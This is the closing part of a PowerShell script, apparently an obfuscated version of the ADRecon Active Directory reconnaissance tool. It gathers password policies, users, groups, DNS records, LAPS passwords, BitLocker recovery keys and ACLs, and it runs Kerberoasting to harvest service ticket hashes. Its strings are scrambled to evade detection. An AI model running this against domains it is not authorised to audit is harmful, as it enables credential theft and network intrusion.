        Write-Output ("{5}{0}{1}{4}{2}{3}" -f' D','efau','Poli','cy','lt Password ','[-]')
        $ADRObject = Get-ADRDefaultPasswordPolicy -Method $Method -objDomain $objDomain
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ("{5}{4}{1}{3}{0}{2}" -f 'oli','asswo','cy','rdP','ultP','Defa')
            Remove-Variable ADRObject
        }
        Remove-Variable ADRPasswordPolicy
    }
    If ($ADRFineGrainedPasswordPolicy)
    {
        Write-Output ("{11}{0}{4}{2}{9}{1}{6}{7}{8}{3}{10}{5}{12}" -f' Fine',' P','ned P','vileg',' Grai','un','oli','cy ','- May need a Pri','assword','ed Acco','[-]','t')
        $ADRObject = Get-ADRFineGrainedPasswordPolicy -Method $Method -objDomain $objDomain
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ("{6}{3}{4}{0}{2}{5}{1}"-f 'assw','y','o','neGr','ainedP','rdPolic','Fi')
            Remove-Variable ADRObject
        }
        Remove-Variable ADRFineGrainedPasswordPolicy
    }
    If ($ADRDomainControllers)
    {
        Write-Output ("{3}{5}{4}{1}{0}{2}"-f'ler','n Control','s','[-] Do','ai','m')
        $ADRObject = Get-ADRDomainController -Method $Method -objDomain $objDomain -Credential $Credential
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ("{0}{1}{3}{2}"-f'DomainCon','tro','s','ller')
            Remove-Variable ADRObject
        }
        Remove-Variable ADRDomainControllers
    }
    If ($ADRUsers -or $ADRUserSPNs)
    {
        If (!$ADRUserSPNs)
        {
            Write-Output ("{6}{1}{5}{2}{4}{7}{3}{0}{8}"-f' ti','] User','- May t','e','ak','s ','[-','e som','me')
            $ADRUserSPNs = $false
        }
        ElseIf (!$ADRUsers)
        {
            Write-Output ("{1}{2}{3}{0}" -f'Ns','[-] U','ser',' SP')
            $ADRUsers = $false
        }
        Else
        {
            Write-Output ("{4}{2}{3}{6}{0}{11}{8}{9}{1}{5}{7}{10}" -f'N','ay take','a','nd ','[-] Users ',' som','SP','e ',' -',' M','time','s')
        }
        Get-ADRUser -Method $Method -date $date -objDomain $objDomain -DormantTimeSpan $DormantTimeSpan -PageSize $PageSize -Threads $Threads -ADRUsers $ADRUsers -ADRUserSPNs $ADRUserSPNs
        Remove-Variable ADRUsers
        Remove-Variable ADRUserSPNs
    }
    If ($ADRPasswordAttributes)
    {
        Write-Output ("{5}{9}{4}{8}{1}{10}{3}{6}{2}{7}{0}"-f'xperimental','rdAt','-','r','ass','[-','ibutes ',' E','wo','] P','t')
        $ADRObject = Get-ADRPasswordAttributes -Method $Method -objDomain $objDomain -PageSize $PageSize
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ("{0}{1}{3}{2}"-f'Passwo','rdAttrib','es','ut')
            Remove-Variable ADRObject
        }
        Remove-Variable ADRPasswordAttributes
    }
    If ($ADRGroups -or $ADRGroupChanges)
    {
        If (!$ADRGroupChanges)
        {
            Write-Output ("{0}{6}{1}{4}{3}{2}{5}"-f'[-] Groups','- May ',' t','some','take ','ime',' ')
            $ADRGroupChanges = $false
        }
        ElseIf (!$ADRGroups)
        {
            Write-Output ("{6}{13}{3}{0}{8}{5}{1}{2}{10}{4}{11}{9}{12}{7}" -f 'embership ',' -',' ','roup M','ay tak','anges','[-] ','ime','Ch','e','M','e som',' t','G')
            $ADRGroups = $false
        }
        Else
        {
            Write-Output ("{2}{3}{13}{14}{1}{6}{5}{10}{11}{9}{0}{4}{12}{8}{7}" -f 'ake','h','[-] Groups',' a',' ','p Chang','i','e','tim',' May t','e','s -','some ','nd Membe','rs')
        }
        Get-ADRGroup -Method $Method -date $date -objDomain $objDomain -PageSize $PageSize -Threads $Threads -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRGroups $ADRGroups -ADRGroupChanges $ADRGroupChanges
        Remove-Variable ADRGroups
        Remove-Variable ADRGroupChanges
    }
    If ($ADRGroupMembers)
    {
        Write-Output ("{6}{8}{0}{1}{9}{7}{3}{4}{5}{2}" -f'ershi','p','ime','t','ak','e some t','[-] Group ','- May ','Memb','s ')

        $ADRObject = Get-ADRGroupMember -Method $Method -objDomain $objDomain -PageSize $PageSize -Threads $Threads
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ("{2}{0}{1}"-f'er','s','GroupMemb')
            Remove-Variable ADRObject
        }
        Remove-Variable ADRGroupMembers
    }
    If ($ADROUs)
    {
        Write-Output ("{1}{3}{0}{2}{5}{7}{4}{6}"-f ' ','[','Organi','-]',' (OU','zationalUni','s)','ts')
        $ADRObject = Get-ADROU -Method $Method -objDomain $objDomain -PageSize $PageSize -Threads $Threads
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName "OUs"
            Remove-Variable ADRObject
        }
        Remove-Variable ADROUs
    }
    If ($ADRGPOs)
    {
        Write-Output ("{1}{0}" -f'-] GPOs','[')
        $ADRObject = Get-ADRGPO -Method $Method -objDomain $objDomain -PageSize $PageSize -Threads $Threads
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ("{0}{1}"-f'G','POs')
            Remove-Variable ADRObject
        }
        Remove-Variable ADRGPOs
    }
    If ($ADRgPLinks)
    {
        Write-Output ("{5}{4}{9}{6}{0}{2}{10}{1}{7}{3}{8}"-f'p','nt','e ','(SO',' gPLinks -','[-]','Sco',' ','M)',' ','of Manageme')
        $ADRObject = Get-ADRgPLink -Method $Method -objDomain $objDomain -PageSize $PageSize -Threads $Threads
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ("{0}{1}" -f'gPLink','s')
            Remove-Variable ADRObject
        }
        Remove-Variable ADRgPLinks
    }
    If ($ADRDNSZones -or $ADRDNSRecords)
    {
        If (!$ADRDNSRecords)
        {
            Write-Output ("{0}{2}{1}{3}{4}"-f '[-','NS Zo','] D','ne','s')
            $ADRDNSRecords = $false
        }
        ElseIf (!$ADRDNSZones)
        {
            Write-Output ("{0}{3}{1}{2}" -f '[-] DNS','Rec','ords',' ')
            $ADRDNSZones = $false
        }
        Else
        {
            Write-Output ("{3}{1}{2}{4}{0}" -f 'cords','one','s','[-] DNS Z',' and Re')
        }
        Get-ADRDNSZone -Method $Method -objDomain $objDomain -DomainController $DomainController -Credential $Credential -PageSize $PageSize -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRDNSZones $ADRDNSZones -ADRDNSRecords $ADRDNSRecords
        Remove-Variable ADRDNSZones
    }
    If ($ADRPrinters)
    {
        Write-Output ("{1}{0}{3}{2}"-f'in','[-] Pr','ers','t')
        $ADRObject = Get-ADRPrinter -Method $Method -objDomain $objDomain -PageSize $PageSize -Threads $Threads
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ("{1}{0}" -f'rs','Printe')
            Remove-Variable ADRObject
        }
        Remove-Variable ADRPrinters
    }
    If ($ADRComputers -or $ADRComputerSPNs)
    {
        If (!$ADRComputerSPNs)
        {
            Write-Output ("{2}{8}{0}{6}{10}{9}{3}{7}{1}{4}{5}"-f'omputer','m','[-',' s','e tim','e','s -','o','] C','take',' May ')
            $ADRComputerSPNs = $false
        }
        ElseIf (!$ADRComputers)
        {
            Write-Output ("{4}{0}{2}{3}{1}"-f '-]','SPNs',' Comp','uter ','[')
            $ADRComputers = $false
        }
        Else
        {
            Write-Output ("{6}{1}{7}{5}{8}{3}{4}{0}{2}" -f 'e','] Computers and S',' some time','ta','k','s - M','[-','PN','ay ')
        }
        Get-ADRComputer -Method $Method -date $date -objDomain $objDomain -DormantTimeSpan $DormantTimeSpan -PassMaxAge $PassMaxAge -PageSize $PageSize -Threads $Threads -ADRComputers $ADRComputers -ADRComputerSPNs $ADRComputerSPNs
        Remove-Variable ADRComputers
        Remove-Variable ADRComputerSPNs
    }
    If ($ADRLAPS)
    {
        Write-Output ("{0}{1}{3}{4}{5}{2}"-f '[-] LAPS - ','Nee','leged Account','ds ','Pri','vi')
        $ADRObject = Get-ADRLAPSCheck -Method $Method -objDomain $objDomain -PageSize $PageSize -Threads $Threads
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ("{1}{0}" -f'S','LAP')
            Remove-Variable ADRObject
        }
        Remove-Variable ADRLAPS
    }
    If ($ADRBitLocker)
    {
        Write-Output ("{6}{0}{12}{5}{4}{3}{1}{10}{9}{7}{13}{11}{2}{8}"-f'Locker R','s','cc','d','- Nee','s ','[-] Bit','iv','ount','Pr',' ','ged A','ecovery Key','ile')
        $ADRObject = Get-ADRBitLocker -Method $Method -objDomain $objDomain -DomainController $DomainController -Credential $Credential
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ("{2}{4}{1}{3}{0}{5}" -f 'Key','eco','BitLock','very','erR','s')
            Remove-Variable ADRObject
        }
        Remove-Variable ADRBitLocker
    }
    If ($ADRACLs)
    {
        Write-Output ("{3}{8}{1}{7}{2}{6}{5}{0}{4}" -f 'ome ',' ACL','- M','[-','time','s','ay take ','s ',']')
        $ADRObject = Get-ADRACL -Method $Method -objDomain $objDomain -DomainController $DomainController -Credential $Credential -PageSize $PageSize -Threads $Threads
        Remove-Variable ADRACLs
    }
    If ($ADRGPOReport)
    {
        Write-Output ("{6}{5}{0}{4}{3}{2}{1}" -f 'May t','e','tim','e some ','ak','] GPOReport - ','[-')
        Get-ADRGPOReport -Method $Method -UseAltCreds $UseAltCreds -ADROutputDir $ADROutputDir
        Remove-Variable ADRGPOReport
    }
    If ($ADRKerberoast)
    {
        Write-Output ("{3}{1}{0}{2}" -f ' Ker','-]','beroast','[')
        $ADRObject = Get-ADRKerberoast -Method $Method -objDomain $objDomain -Credential $Credential -PageSize $PageSize
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ("{2}{0}{1}{3}" -f 'r','o','Kerbe','ast')
            Remove-Variable ADRObject
        }
        Remove-Variable ADRKerberoast
    }
    If ($ADRDomainAccountsusedforServiceLogon)
    {
        Write-Output ("{4}{8}{17}{5}{10}{13}{0}{2}{11}{3}{9}{16}{15}{18}{19}{14}{6}{1}{7}{12}" -f 'oun','leged ','ts used for','r','[-','ma','vi','Acc',']','vi','i',' Se','ount','n Acc',' Needs Pri',' ','ce',' Do','Logo','n -')
        $ADRObject = Get-ADRDomainAccountsusedforServiceLogon -Method $Method -objDomain $objDomain -Credential $Credential -PageSize $PageSize -Threads $Threads
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ("{6}{7}{1}{0}{2}{3}{5}{4}"-f 'suse','nt','dforServic','eL','on','og','DomainAcco','u')
            Remove-Variable ADRObject
        }
        Remove-Variable ADRDomainAccountsusedforServiceLogon
    }

    $TotalTime = "{0:N2}" -f ((Get-DateDiff -Date1 (Get-Date) -Date2 $date).TotalMinutes)

    $AboutADRecon = Get-ADRAbout -Method $Method -date $date -ADReconVersion $ADReconVersion -Credential $Credential -RanonComputer $RanonComputer -TotalTime $TotalTime

    If ( ($OutputType -Contains "CSV") -or ($OutputType -Contains "XML") -or ($OutputType -Contains ("{1}{0}"-f 'SON','J')) -or ($OutputType -Contains ("{0}{1}"-f'HTM','L')) )
    {
        If ($AboutADRecon)
        {
            Export-ADR -ADRObj $AboutADRecon -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ("{0}{2}{1}" -f'AboutADR','con','e')
        }
        Write-Output "[*] Total Execution Time (mins): $($TotalTime) "
        Write-Output ('['+'*] '+'Outp'+'u'+'t '+'D'+'i'+'rectory:'+' '+"$ADROutputDir")
        $ADRSTDOUT = $false
    }

    Switch ($OutputType)
    {
        ("{1}{0}{2}"-f'DOU','ST','T')
        {
            If ($ADRSTDOUT)
            {
                Write-Output "[*] Total Execution Time (mins): $($TotalTime) "
            }
        }
        ("{1}{0}" -f 'L','HTM')
        {
            Export-ADR -ADRObj $(New-Object PSObject) -ADROutputDir $ADROutputDir -OutputType $([array] ("{1}{0}"-f 'TML','H')) -ADRModuleName ("{1}{0}" -f'dex','In')
        }
        ("{1}{0}"-f'CEL','EX')
        {
            Export-ADRExcel $ADROutputDir
        }
    }
    Remove-Variable TotalTime
    Remove-Variable AboutADRecon
    Set-Location $returndir
    Remove-Variable returndir

    If (($Method -eq ("{0}{1}" -f 'A','DWS')) -and $UseAltCreds)
    {
        Remove-PSDrive ADR
    }

    If ($Method -eq ("{1}{0}" -f 'AP','LD'))
    {
        $objDomain.Dispose()
        $objDomainRootDSE.Dispose()
    }

    If ($ADROutputDir)
    {
        Remove-EmptyADROutputDir $ADROutputDir $OutputType
    }

    Remove-Variable ADReconVersion
    Remove-Variable RanonComputer
}

If ($Log)
{
    Start-Transcript -Path "$(Get-Location)\ADRecon-Console-Log.txt"
}

Invoke-ADRecon -GenExcel $GenExcel -Method $Method -Collect $Collect -DomainController $DomainController -Credential $Credential -OutputType $OutputType -ADROutputDir $OutputDir -DormantTimeSpan $DormantTimeSpan -PassMaxAge $PassMaxAge -PageSize $PageSize -Threads $Threads

If ($Log)
{
    Stop-Transcript
}
